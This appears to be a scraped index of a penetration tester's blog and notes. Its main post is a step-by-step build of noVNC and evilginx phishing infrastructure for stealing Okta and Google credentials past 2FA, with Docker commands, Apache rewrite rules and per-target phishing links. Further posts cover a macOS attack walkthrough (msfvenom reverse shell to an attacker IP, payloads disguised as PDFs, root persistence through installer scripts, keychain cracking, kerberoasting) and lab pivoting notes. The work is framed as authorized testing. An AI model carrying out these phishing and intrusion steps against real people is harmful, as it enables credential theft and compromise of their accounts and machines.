noVNC","keywords":"","body":"Read this awesome blog on using noVNC to get around evilginx getting caught during engagements and wanted to put it to work - https://mrd0x.com/bypass-2fa-using-novnc/\nFirst I followed the original setup and got it up and running and made a few observations right away\n\nResource usage: my lowly t2.small was hurting with just a few vnc servers running and would be noticably laggy to the end user\nPorts: how ever big the target list is, thats how many ports I've got to open on my security group now\nSystem access: assuming someone gets out of the kiosk browser, they're now running as the standard ubuntu user in a shared lab\nFirefox profiles were getting weird, I played with script out the creation of numerous profiles then would launch firefox on each vncserver display like so: vncserver -depth 32 -geometry 2000x1000 -localhost no\nsudo ./noVNC/utils/novnc_proxy --vnc 0.0.0.0:5901 --listen 80 &\nenv DISPLAY=:1 firefox -P 1 https://accounts.google.com/signin --kiosk &\nenv DISPLAY=:1 firefox -CreateProfile 1\nGiven these issues, I went down the rabbit hole to build on this killer concept.\n\nDocker to the rescue\nI then went on an adventure for solutions, tried various noVNC docker containers with hit and miss issues on each, finally settled on https://hub.docker.com/r/accetto/ubuntu-vnc-xfce-firefox-g3 as it ran a light system, was about 500MB, and already had noVNC running.\nFirst moved up to a t3a.large so i had plenty of headroom for lots of containers to run  and Ubuntu 20.04 LTS\nI pulled down that image after installing docker and started tinkering. \ndocker pull accetto/ubuntu-vnc-xfce-firefox-g3\ndocker run -it -p6901:6901 accetto/ubuntu-vnc-xfce-firefox-g3 /bin/bash\nThe creator of this container left helpful scripts at the root under /dockerstartup/ showing how everything put together and noVNC was found under /usr/libexec/noVNCdim\nI changed up a bit from the original blog and went with the vnc_lite.html as my working session. Modifying it to hide the top bar was done by changing the following line toward the bottom:\n\n    \n        Loading\n        Send CtrlAltDel\n    \nList of other changes made to my golden image container here:\n\n~~renamed the default vnc_lite.html to just \"okta.html\" as I planned to target this orgs okta panel. ~~i hit page resizing issues and ended up just copying vnc.html and doing the same edits to it that mrd0x recommended\nfresh favicon to get rid of the noVNC one added under /usr/libexec/noVNCdim/app/images/ and updated the previously named vnc.html  \nrenamed the title of the page from noVNC to CLIENT_NAME\nmodified line 1700 of /usr/libexec/noVNCdim/app/ui.js - removed e.detail.name that keeps changing the title \nhid all desktop icons, changed the background to an eye watering bright white, and set the dock and menu bar panels to hide always.\nyanked headless from sudo group - gpasswd -d headless sudo\nFinally an updated password for the VNC session - lets make it obnoxious so the final URL looks somewhat better - http://fhlipzero.xxx/okta.html?autoconnect=true&resize=remote&password=9VO4e1wXMO2E3MsjKB6BYng3WaC33c3d6NzFU195v\n\n\nHappy with the results, lets lock it down and get it ready for mass deployment: docker commit ID firefox/client:auto\nI tinkered with getting firefox to open to my phishing page automatically on docker run via a Dockerfile or docker-compose.yml but... I'm shit at docker and the clock is ticking. So lazy way it is and this is all I'm running to get all the containers up and running with the phishing page already open and in kiosk mode:\ndocker run -d --add-host evilginx_domain:ip -p6901:6901 --name user1 firefox/client:auto\ndocker run -d --add-host evilginx_domain:ip -p6902:6901 --name user1 firefox/client:auto\ndocker exec user1 sh -c \"env DISPLAY=:1 firefox https://accounts.google.com/signin --kiosk &\"\ndocker exec user2 sh -c \"env DISPLAY=:1 firefox https://accounts.google.com/signin --kiosk &\"\nSo browsing both sessions works pretty good and I'm satisfied with performance, just need to get the last bit done to hide the URLs a little and avoid opening a shitload of ports. Started down setting up a proxypass config in Apache and discovered wonders of websockets...   Heres my basic proxypass setup for two users, nothing crazy, just pushing any request for path /user1 to the user1 container listening on 6901, and /user2 to 6902 that I took notes off of from this article https://datawookie.dev/blog/2021/08/websockify-novnc-behind-an-nginx-proxy/   \nProxyPass /user1 http://127.0.0.1:6901/\nProxyPassReverse /user1 http://127.0.0.1:6901/\nProxyPass /user2 http://127.0.0.1:6902/\nProxyPassReverse /user2 http://127.0.0.1:6902/\nWith the added /user1 path added, noVNC is RIP and the session refuses to connect now over proxypassed connection at ip/vnc.html. Checking the dev console in firefox tells the story, Failed GET request to ip/websockify... meaning my request to /user1/fhlipzero.html is still hitting the root path to send the websocket upgrade request noVNC needs to do what it does. I played with different ways to proxy the connection and finally came down to this mod_rewrite instead of using the ProxyPass:\nRewriteEngine On\nRewriteCond %{HTTP:Upgrade} =websocket [NC]\nRewriteRule ^/(.*) ws://localhost:6901/$1 [P,L]\nRewriteCond %{HTTP:Upgrade} !=websocket [NC]\nRewriteRule ^/(.*) http://localhost:6901/$1 [P,L]\nI tried adding the path to the rewrite rule like: RewriteRule ^/user1/(.*) ws:// but that broke it again and gave the same issue proxypass did. So what to do now? virtualhosts...\nKinda dumb solution but did the job, I just make a new virtual host for every user and let Apache handle it with name based virtual host support. So my config for this apache site ends up looking like:\nhome/ubuntu# cat /etc/apache2/sites-available/000-default.conf\nNameVirtualHost *\n\n\n    ServerName ssl1.fhlipzero.xxx\n    ProxyPreserveHost off\n    DocumentRoot /var/www/html\n\n    ErrorLog ${APACHE_LOG_DIR}/error.log\n    CustomLog ${APACHE_LOG_DIR}/access.log combined\n\n    RewriteEngine On\n    RewriteCond %{HTTP:Upgrade} =websocket [NC]\n    RewriteRule ^/(.*)           ws://localhost:6901/$1 [P,L]\n    RewriteCond %{HTTP:Upgrade} !=websocket [NC]\n    RewriteRule ^/(.*)           http://localhost:6901/$1 [P,L]\n\n\n\n        ServerName ssl2.fhlipzero.xxx\n        ProxyPreserveHost off\n        ServerAdmin webmaster@localhost\n        DocumentRoot /var/www/\n        ErrorLog ${APACHE_LOG_DIR}/error.log\n        CustomLog ${APACHE_LOG_DIR}/access.log combined\n\n\n        #Include conf-available/serve-cgi-bin.conf\n        RewriteEngine On\n        RewriteCond %{HTTP:Upgrade} =websocket [NC]\n        RewriteRule ^/(.*)           ws://localhost:6902/$1 [P,L]\n        RewriteCond %{HTTP:Upgrade} !=websocket [NC]\n        RewriteRule ^/(.*)           http://localhost:6902/$1 [P,L]\n\nMeans I have to add a new subdomain record now too but no biggie. \nhttp://ssl1.fhlipzero.io/okta.html?autoconnect=true&resize=remote&password=9VO4e1wXMO2E3MsjKB6BYng3WaC33c3d6NzFU195v\nFrom here... the rest is business as usual, I'll setup evilginx and get an okta phishlet up and running, then simply change up my big docker run script so it opens my evilginx hosted phishing page thats happily tucked away with only internal access to it from the containers...  \nSo I end up with an excel sheet and some gross concats formulas to \n\nstretch out creating the docker commands to spin up the containers\nrun firefox with the phishing landing page already loaded in kiosk mode\nthen the noVNC URL I'll include in the phishing email to each target\n\ndocker run -d --add-host ssl1.fhlipzero.io:172.31.42.77 -p6901:6901 --name  user1 firefox/CLIENT:latest\ndocker run -d --add-host ssl1.fhlipzero.io:172.31.42.77 -p6902:6901 --name  user2 firefox/CLIENT:latest\n\ndocker exec user1 sh -c \"env DISPLAY=:1 firefox https://ssl1.fhlipzero.io/redirect --kiosk &\"\ndocker exec user2 sh -c \"env DISPLAY=:1 firefox https://ssl1.fhlipzero.io/redirect --kiosk &\"\n\nhttp://ssl1.fhlipzero.io/okta.html?autoconnect=true&resize=remote&password=9VO4e1wXMO2E3MsjKB6BYng3WaC33c3d6NzFU195v\nhttp://ssl2.fhlipzero.io/okta.html?autoconnect=true&resize=remote&password=9VO4e1wXMO2E3MsjKB6BYng3WaC33c3d6NzFU195v\n\nSetup x number of A records poiting back to each subdomain   \n\nSetup the virtualhost file in apache to handle the subdomains   \n\nEvilginx is a single lure for me to capture creds on, I can track per user by the noVNC logs later\nMy t3a (2 vCPU and 8GB ram) is running 20 containers pretty well right now   \nSome OPSEC considerations - kiosk breakout is very possible, you can easily get into the firefox settings and then start roaming the system as the docker headless user.

It’s a niche that is commonly perceived to be more secure than your typical Windows domain out of obscurity and even more so when you throw M1 based Macs into the mix.  I’ll be going over some of Schellman’s methodology on how we approach an internal engagement knowing that we’ll be landing on macOS and some best recommendations to keep that Mac environment secure.\nInitial Access\nInitial access comes in many forms in macOS, some of which but are not limited to malicious documents, Installer packages, executables, or malicious scripts a user may be tricked into running.  The testing environment I’ll be working out of is a standard Kali box acting as the attacker, then a 2021 M1 (not M1 Pro or M1 Max, although these chips would be impacted in the same way) MacBook Pro running macOS Monterey version 12.0.1 in a Virtual Machine without Rosetta 2 installed to demonstrate how this affects initial access and tooling.\nFingerprinting a M1 Mac\nFirst, a quick word on M1 Macs and how they act out of the box. Below is a screenshot taken from my freshly deployed Virtual Machine showing output of the “uname -a” command. From this, we verify it’s running the arm64 version of macOS, the “About this Mac” pane, and finally the popup a user receives when trying to run an application not optimized for M1 processors.  Basically, macOS is asking the user to allow Rosetta 2 to be installed, thus allowing x64 / non-M1 optimized applications to run, but how does this affect our payloads if we click Not Now and does this make the endpoint any more secure? \n\nSimple Shell\nLet’s start nice and simple with a basic reverse shell, this could be hidden inside a malicious application, a script presented to the user as required for a job function in an email, or quickly ran on an unlocked, unmonitored Mac.  This example is executed via Python2 that ships by default on macOS as of writing. Apple has stated that it will be removed in the future (https://developer.apple.com/documentation/macos-release-notes/macos-catalina-10\\_15-release-notes) .  The payload is generated via “msfvenom” on our attacker box like below and tells the payload to call back to the attacker’s IP on port 443:  \nmsfvenom -p python/shell_reverse_tcp LHOST=10.0.1.189 LPORT=443\nOnce executed on the target Mac via Python in the top Terminal window, we see the shell calling back to the attacker without issue and allows us to execute another uname, whoami, and hostname commands as expected.  But this only gives us basic command execution, so let’s crank up the complexity and try out some of the command-and-control (C2) tooling available for macOS engagements.   \n   \nBinary Payloads\nNumerous C2s exist to generate an executable targeting macOS but most also build specifically for x64 processors, not the Apple M1 chip.  The “poseidon” payload generated out of Mythic gives us our first douse of cold water without Rosetta 2 installed:\n     \nAt least if Rosetta 2 were installed, we could help the payload out by specifying the architecture in Terminal by running “arch -x86_64 ./poseidon”, but we aren’t giving in just yet. Let’s try out an “apfell” payload which runs through osascript instead.  Running the generated apfell.js payload through “osascript” gets us a successful callback to Mythic and we’re able to run a whoami and uname showing we’re still running on as arm64 on the M1 Virtual Machine:   \n     \nMalicious Documents\nNow that we know apfell payloads have no issue calling back, let’s fancy this up a little and wrap it around a better pretext that user is more likely to run.  We can utilize the Mystikal project along with Mythic to generate the following payload that masquerades as a PDF (bottom square) to the user, but really executes the same apfell payload as before giving us a new callback in Mythic (top square) and leaving the user unaware of the active attacker now living on their Mac.   \n     \nInstaller packages\nLots of payloads are working great but there are two remaining issues, we have no persistence, meaning we’ll lose the connection if the user reboots, and we’re only running as the “schellman” local user.  Both of these issues are solved via the very flexible installer packages commonly utilized for more complex application installations. Using an internally developed process (credit: Nathan Rague) our team is able to generate a package that does all of the following:   \n•    Establish persistence via a LaunchDaemon as the “root” user and a LaunchAgent as the current user executed at a defined interval\n•    Copy any of the created payloads to a local directory to be later called by the above persistence\n•    Automatically configure new sleep settings, execute the initial payload, or a secondary payload via the installer packages postinstall script to ensure the target mac stays online for testing and a connection is received. \nThe postinstall script also gives us the unique opportunity to fix the missing Rosetta 2 problem if we like.  Investigation was completed shortly after I worked on my first M1 Mac on exactly how Rosetta 2 is installed and it turns out, it’s just an added argument onto the software update program built into macOS and only made available on M1 Macs.  Combine this with knowing postinstall scripts run commands normally reserved for copying files or other installation activities, we can slide in the following line to install Rosetta 2 along with our pentest payload: “/usr/sbin/softwareupdate --install-rosetta --agree-to-license”.  One last takeaway to be noted on installation packages on M1 Macs in particular, a package that has yet to be optimized will likely fail stating that it’s not compatible with this version of macOS.  This ended up being a simple precheck that Installer does when loading up a .pkg file, Installer checks the packages Distribution file for the target architecture which non-optimized macs will list as “hostArchitectures=\"x86_64”, we can solve the install issue by adding “arm64” to the hostArchitectures section and our install will complete successfully.    \nInitial access gained, now what?\n We’ve successfully got a call back from a payload in the M1 Mac , now we’ll run through some local enumeration, privilege escalation opportunities, and then move into network and lateral movement investigation.\nAssuming we’re running under the context of a regular user, we’ll be looking around the user’s home folder first to see what is sitting cleartext.  Apple does protect Downloads, Documents, and Desktop with something called Transparency Consent and Control (TCC) framework which forces you to allow access to a directory via the desired application in System Preferences / Security Privacy / Privacy or hitting allow on the popup like below:\n     \nHowever, anything in your actual /Users/schellman/ folder is readable by any user logged in locally, admin or not, which could be any of the following:•    .zsh_history / .bash_history (showing any commands run giving context to how a machine was setup, default deployment activity, passwords that were passed inline to another application, hints toward configuration files which may contain more sensitive information, hints toward other hosts this endpoint has ssh’d to in the past)\n•    .aws, .config, or .azure directories that may contain unsecured credentials\n•    SSH keys\n•    Slack cookies (good for social engineering co-workers in to resetting passwords or general information gathering) \n•    Library Folder containing Messages from iCloud and then Keychains for local saved passwords\n•    Browser history\nKeychains are our next point of focus, Apple makes it easy to save and sync passwords via your Keychain and multiple devices which much like on Windows, can also be retrieved with the right access.  The actual keychain database is located under each user's home folder at ~/Library/Keychain/login.keychain-db and can be downloaded for further analysis offline.  We can use the dump-all feature of chainbreaker to get an idea of the content of the Keychain to see if it’s in use and worth the time put into cracking the password for it.    \n     \nThis being my own test keychain, I can verify I have 1 useful password to another test machine saved but the remaining saved passwords are mostly app passwords used by iCloud and other macOS related services.  The cracking time varies depending on complexity but retrieving the Keychain hash then unlocking it can open another valuable pivot point into a cloud only environment.  Here we can see my very secure Keychain password of “schellman” being cracked via “hashcat -m 23100” and a short wordlist of company names:   \n     \nThen providing the cracked password to chainbreaker again, we can see the saved password:\n     \nFinally, we’ll go through some lateral movement and domain reconnaissance we can perform from macOS.  Assuming we’re not in a cloud only environment or a user’s home network, nmap installs just fine on a Mac to give us a network footprint over an office internet connection or VPN so we can find our next targets that may be hosting vulnerable services.  Also, with .NET 5.0 supporting cross compilation, we can now drop Inveigh to disk and capture SMB NTLM challenge and responses along with various man-in-the-middle and password sniffing attacks.\nIf we land on a domain joined mac, we can perform much of the same domain enumeration as we can on Windows like below:\nList Users: dscl \"/Active Directory/CORP/All Domains\" ls /Users\nList Computers: dscl \"/Active Directory/CORP/All Domains\" ls /Computers\nList Groups: dscl \"/Active Directory/CORP/All Domains\" ls /Groups\nList Domain Info: dsconfigad -show\nFrom here, we can then bring in the Bifrost project to interact with AD and list out Kerberos tickets for the current user and list out kerberoastable hashes to be cracked offline later by specifying its “-kerberoast true” flag.   \nRecommendations / Prevention?\nMany of the attacks presented here can be prevented from a user education level covering not installing unsigned packages or accepting unsolicited prompts that want to make changes to their system. We always recommend a strong monitoring platform that alerts on unsigned packages being installed or unsigned executables being allowed to execute by a user and using strong passwords to prevent cracking, these can largely be assigned as requirements via most RMM solutions.   \nWrap Up\nWe’re just scratching the surface in this article on the myriad of attack paths one can take when working through a macOS penetration test.

I say fun after having left and returned to this lab 3 times over the last months since its release. The important thing to remember is keeping it simple, common exploits and credentials re-use are rampant in Dante so be sure to harvest creds from each compromised host and grep each one for the \"DANTE{\" flag in case you leave one behind. I came out of it with a nice refresher on CTF labs since CRTO in 2020 and OSCP in 2018, and am using this as my first descent sized article more for my own reference but if someone find its useful, thats cool too.\nPivots\nPretty sure I bought access to Dante the day it came out, super exicted, I ripped into the lab and got to work. I distinctly remember the first hop being a nice refreshing dip in then boom, you're in open water.\nEverything from here on either happens from local on the first hop machine or through a proxy / ssh forward / ssh reverse port forward. An ssh dynamic proxy tunnel\nssh -f -N -D 8888 root@dante-ip\nmade for easy access to resource on the first hop via firefox / foxyproxy but getting shells to call back after that basically needed a reverse proxy. Below is my lab version of what pivots looked like as to not spoint but the principle basically is:\nget root on first hop, add your user public key to /root/.ssh/authorized_keys, then configure .ssh/config file on your local machine. My ssh config file shows 2 hops deep using proxyjump.\nssh config\n\nHost hop1\n    User hop1\n    Hostname 10.0.1.109\n    Port 22\n\nHost hop2\n    User hop2\n    Hostname 10.0.1.101\n    Port 22\n    ProxyJump hop1\nImportant to note that for this method to work, you must change sshd_config gateway ports to yes and restart ssh on each hop.\nSo now ssh -R 8001:10.0.1.122:8001 hop2 carries port 8001 from my local box, to the hop2 machine exposing it to the rest of that internal network.\nFor two hops this time\nssh -R 8001:127.0.01:8001 hop2 tells ssh to carry local port 8001 through each hop resulting on a listening port on hop2 that'll reach back to our attacker box. Seen below is an example of my ssh config, then demonstrating the connection to hop2:8001 calling back to my local kali python3 web server.\n\nEnumeration\nSeriously keep this one simple, enumerate the hosts through your pivot and just pick one. You'll find the low hanging fruit in no time and start popping shells. From there, cred use kicks in and you'll need to be diliegent about popping a box, harvesting creds, and then checking for reuse on other boxes. Same goes for checking local accounts for interesting things that may point to a next hop or step in the game.\nC2_Usage\nThis falls under the \"dont overthink it\" category again. While its tempting to spend hours getting cobalt strike / covenant working in this lab, its not necessary here. The lab reverts frequently enough that any foothold / persistence will be wiped out the next day. Some exercises did require an AV Evasive payload but this can be accomplished by a variable renamed Invoke-PowershellTcp.ps1 all the same.\nNothing else really to add for now, dante good, procrastination and overthinking bad\n"},"blogs/5_gitbook/gitbook_readme.html":{"url":"blogs/5_gitbook/gitbook_readme.html","title":"Gitbook setup","keywords":"","body":"I followed this run down which got me up and running on a personal gitlab instance easiest  \nhttps://colab.pages.oit.duke.edu/-/external-docs/-/jobs/31499/artifacts/_book/guides/ci.html\nBasically ended up being:\nubuntu server as runner:\n\nnpm install -g gitbook\nsudo apt-get install apache2\ninstall the runnerhttps://docs.gitlab.com/runner/install/   \nsudo rm /var/www/html/*\nsudo chown root:gitlab-runner /var/www/html\nsudo chmod 775 /var/www/html\nsudo gitlab-ci-multi-runner register\nnew project on gitlab\nclone repo down\ngitbook init\nsetup gitlab yaml\n\nexample yaml\n\n```\nimage: node:6\n\nbuild:\n    stage: build\n    artifacts:\n        paths:\n         - _book\n    script: \n     - npm install gitbook-cli && node node_modules/gitbook-cli/bin/gitbook.js build\n    tags:\n     - build-capable\n\ntest:\n    stage: test\n    script: \n     - echo \"no tests.\"\n    tags:\n     - test-capable\n\ndeploy:\n    stage: deploy\n    script:\n     - rm -rf /var/www/html/*\n     - cd _book\n     - cp -rf . /var/www/html\n     - echo \"this is where it'll distribute itself wherever is necessary!\"\n    tags:\n     - deploy-capable\n    only: \n     - master\n```\n\n\n\nTo work locally with this project, you'll have to follow the steps below:\ncurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.1/install.sh | bash\nnvm install 9\nnpm install gitbook-cli -g\nclone this repo and cd into it  \ngitbook build  \ngitbook serve\nTo edit or add pages\ncreate a new folder per post\nadd readme or just content\nimages should use an img src tag to avoid issues\n\nhttps://gitlab.com/pages/gitbookhttps://docs.gitlab.com/runner/install/\n"},"notes/windows/windows_readme.html":{"url":"notes/windows/windows_readme.html","title":"Windows","keywords":"","body":"Finding stuff\nGet-ChildItem -recurse | Get-Content | Select-String -pattern \"OFFSHORE{\"\nADCS Rabbithole\n"},"notes/mac/mac_readme.html":{"url":"notes/mac/mac_readme.html","title":"Macs","keywords":"","body":"General Mac\nlistening ports  \nlsof -i -P | grep LISTEN | grep :$PORT\nstop vnc from locking on disconnect - using this to keep Conways game of life running on an old mac mini sparking new \"life\" everytime port 3389 is hit  \nsudo defaults write /Library/Preferences/com.apple.RemoteManagement RestoreMachineState -bool NO\nenable vnc from terminal  \nsudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -users admin -privs -all -restart -agent -menu\nfix go: cannot find GOROOT directory: /usr/local/opt/go/libexec    \nexport GOROOT=\"$(brew --prefix golang)/libexec\"\nstupid DS store files...   \nfind . -name \".DS_Store\" -type f -delete\nheadless resolution change without HDMI dongle   \nbrew install Caskroom/cask/cscreen\ncscreen -d 32 -x 1920 -y 1080 -r 60\nMac VM Customizations   \n### Path bar in finder\ndefaults write com.apple.finder ShowPathbar -bool true\n### Status bar in finder\ndefaults write com.apple.finder ShowStatusBar -bool true\n### ScrollBars bar in finder\ndefaults write -g AppleShowScrollBars -string “Always”\n### Always list style in windows\ndefaults write com.apple.finder FXPreferredViewStyle -string “Nlsv”\n### Clear ALL dock icons\ndefaults write com.apple.dock persistent-apps -array\nSources\nhttps://github.com/kevinmcox/outset-scripts\nhttps://github.com/jcarm010/osx-dock-remover/blob/master/dock-icon-remove.py\nhttps://apple.stackexchange.com/questions/340348/remove-macos-dock-icon-with-a-command-in-terminal\nhttps://github.com/sickcodes/osx-optimizer\n"},"notes/linux/linux_readme.html":{"url":"notes/linux/linux_readme.html","title":"Linux","keywords":"","body":""},"notes/linux/one-liners.html":{"url":"notes/linux/one-liners.html","title":"one-liners","keywords":"","body":"Attempting to collect general sed awk grep things I regularly end up re-googling\nexternal ip\ndig +short myip.opendns.com @resolver1.opendns.com\ncurl https://checkip.amazonaws.com/\nfix transported shell\nsed -i 's/\\r//' filename\nfind string in file, recursive, line number, regex word, pattern\ngrep -rnw '/' -e 'flag{'\ngrep for string in file showing output\ngrep -a string ./file\nto exclude a result from the output (thin out nuclei output)\ngrep -v string ./file\nfinds a file, greps it ignoring case, for the specified pattern\nfind . -name '*.txt' -exec grep -i 'aws{' {} \\;
